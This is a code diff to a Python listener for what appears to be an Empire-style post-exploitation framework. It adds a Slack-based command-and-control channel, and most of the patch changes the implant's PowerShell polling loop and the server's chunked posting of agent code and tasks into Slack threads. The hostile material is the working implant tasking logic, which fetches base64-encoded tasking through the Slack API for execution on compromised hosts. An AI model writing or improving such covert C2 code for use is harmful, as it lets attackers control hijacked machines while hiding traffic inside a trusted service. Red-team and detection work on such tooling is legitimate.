@@ -442,13 +442,13 @@ class Listener:
                         return [convert]::FromBase64String($base64)
                     }
 
-                    $Script:task_ts = $null;
+                    $Script:TaskingTracker = @{TaskTS=$null;ServerReplies=0;ServerLastReply=$null};
                     $script:GetTask = {
 
                         write-host '[*] Getting tasks'
 
                         try {
-
+                            $waiting = $false
                             $APIToken = '"""+ api_token +"""'
                             $Channel = '"""+ channel_id +"""'
                             $AgentID = '"""+ agent_id +"""'
@@ -463,46 +463,54 @@ class Listener:
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
                             }
 
-                            # Look for reply to revious tasking message
-                            if($script:task_ts) {
+                            # Look for reply to previous tasking message
+                            if($Script:TaskingTracker.TaskTS) {
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded');
-                                $slack_response2=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/channels.replies","POST","token=$($APIToken)&channel=$($Channel)&thread_ts=$($script:task_ts)")
+                                $slack_response2=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/channels.replies","POST","token=$($APIToken)&channel=$($Channel)&thread_ts=$($Script:TaskingTracker.TaskTS)")
                                 $slack_response=ConvertFrom-Json20 $slack_response2;
 
-                                $replies = $slack_response["messages"] | select -skip 1;
-                                if($replies) {
-                                    $raw_base64 = (($replies | %{ $_["text"] }) -join '').Replace('-MESSAGE_END-','')
+                                if($slack_response['messages'].length -eq 3) {
+                                    $data_thread = $slack_response['messages'][-1]['text']
+                                    write-host "Data thread: $data_thread"
+
+                                    $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded');
+                                    $data_response=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/channels.replies","POST","token=$($APIToken)&channel=$($Channel)&thread_ts=$($data_thread)")
+                                    write-host $data_response
+                                    $data_response=ConvertFrom-Json20 $data_response;
+
+                                    $raw_base64 = (($data_response['messages'] | %{ $_["text"] }) -join '').Replace('-MESSAGE_END-','')
                                     
-                                    #write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
+                                    write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
                                     
                                     $result=Decode-Base64 $raw_base64;
-                                    if($result) {
-                                       # write-host "[*] cypher text decode from base64";
-                                    }
-
                                     $result
+                                }
+                                elseif($slack_response['messages'].length -eq 2) {
+                                    $waiting = $true
                                 }
                             }
 
-                            # meta 'TASKING_REQUEST' : 4
-                            $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
-                            $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
+                            if($waiting -eq $false) {
+                                # meta 'TASKING_REQUEST' : 4
+                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
+                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
 
-                            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
-                            $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
+                                $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
 
-                            $RoutingPacket_base64 = [Convert]::ToBase64String($RoutingPacket)
+                                $RoutingPacket_base64 = [Convert]::ToBase64String($RoutingPacket)
 
-                            try {
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
-                                $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=$([System.Net.WebUtility]::UrlEncode($RoutingPacket_base64))&username=$($AgentID):STAGED")
+                                try {
+                                    $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
+                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=$([System.Net.WebUtility]::UrlEncode($RoutingPacket_base64))&username=$($AgentID):STAGED")
 
-                                # grab the timestamp from the sent message so we can track a response
-                                $slack_response = ConvertFrom-Json20 $response
-                                $Script:task_ts = $slack_response["ts"]
+                                    # grab the timestamp from the sent message so we can track a response
+                                    $slack_response = ConvertFrom-Json20 $response
+                                    $Script:TaskingTracker.TaskTS = $slack_response["ts"]
 
+                                }
+                                catch [System.Net.WebException]{$null}
                             }
-                            catch [System.Net.WebException]{$null}
                         }
                         catch [Net.WebException] {
                             write-host $_
@@ -700,22 +708,32 @@ class Listener:
         def post_data(data_to_send,agent,channel_id,thread_ts,listener_name,api_token):
 
             def split_data(data):
-                n=3500
+                n=39000
                 return [data[i:i+n] for i in range(0, len(data), n)]
 
+            # Slack will automatically split up messages longer than ~3900 chars, and they don't make into their own thread
+            # so if we're making a new thread, we need to post a sinble message so we get the correct thread ID
             slack_client = SlackClient(api_token)
-            parts = split_data(data_to_send)
+            if not thread_ts:
+                parts = [data_to_send[0:3880]] + split_data(data_to_send[3880:-1])
+            else:
+                parts = split_data(data_to_send)
+
             part_count = 1
 
             for part in parts:
 
-                message = "[*] Sending agent code to Slack for {}, part {} of {} sent".format(agent,str(part_count),str(len(parts)))
+                message = "[*] Sending message to Slack for {}, part {} of {} sent ({} bytes)".format(agent,str(part_count),str(len(parts)),len(part))
                 signal = json.dumps({
                     'print' : False,
                     'message': message
                 })
                 dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
                 response = slack_client.api_call('chat.postMessage', channel=channel_id, text=part, as_user=False, thread_ts=thread_ts)
+
+
+                if not thread_ts:
+                    thread_ts = response['ts']
 
                 # have to limit the replies to one per second or face rate limiting
                 time.sleep(0.2)
@@ -729,6 +747,7 @@ class Listener:
             })
             dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
             response = slack_client.api_call('chat.postMessage', channel=channel_id, text='-MESSAGE_END-', as_user=False, thread_ts=thread_ts)
+            return thread_ts
 
         def compress(data):
             compobj = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS|16)
@@ -912,7 +931,9 @@ class Listener:
                                     for task in task_data:
                                         lang, data = task
                                         if data and data != "VALID":
-                                            post_data(base64.encodestring(data),agent,channel_id,thread_ts,listener_name,user_api_token)
+                                            slack_client.api_call('chat.postMessage', channel=channel_id, text="Starting", thread_ts=thread_ts)
+                                            data_thread = post_data(base64.encodestring(data),agent,channel_id,None,listener_name,user_api_token)
+                                            slack_client.api_call('chat.postMessage', channel=channel_id, text=data_thread, thread_ts=thread_ts)
 
                    
                 except Exception as e:
